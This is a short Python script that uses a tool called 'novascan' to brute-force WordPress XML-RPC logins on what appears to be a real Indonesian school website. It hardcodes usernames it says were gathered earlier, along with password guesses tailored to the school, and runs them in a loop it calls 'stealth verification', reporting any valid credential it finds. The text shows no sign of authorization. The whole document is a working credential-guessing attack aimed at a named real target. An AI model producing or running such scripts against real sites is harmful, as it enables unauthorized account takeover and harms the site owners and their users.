import asyncio
import httpx
from novascan.core.requester import NovaRequester
from novascan.modules.nova_brute import NovaBrute

async def main():
    requester = NovaRequester()
    brute = NovaBrute(requester)
    target = "https://smktarunabhakti.sch.id"
    
    # Username yang kita temukan sebelumnya
    users = ["t4runa", "smktarunabhakti", "networking"]
    
    # Password yang mencurigakan berdasarkan analisis kita
    passwords = [
        "tarunabhakti", "t4runabhakti", "tarunabhakti123", 
        "smktarunabhakti", "TBDepok2024", "t4runa2024",
        "admin123", "adminTB"
    ]
    
    print(f"[*] Testing XML-RPC Audit on {target}...")
    
    if await brute.check_xmlrpc(target):
        print("[+] XML-RPC is responding. Starting stealth verification...")
        for user in users:
            for pw in passwords:
                print(f"[*] Trying {user} : {pw} ...")
                if await brute.test_credential(target, user, pw):
                    print(f"\n[!!!] VALID CREDENTIAL FOUND: {user} : {pw}\n")
                    return
    else:
        print("[-] XML-RPC is not vulnerable or blocked.")

if __name__ == "__main__":
    asyncio.run(main())
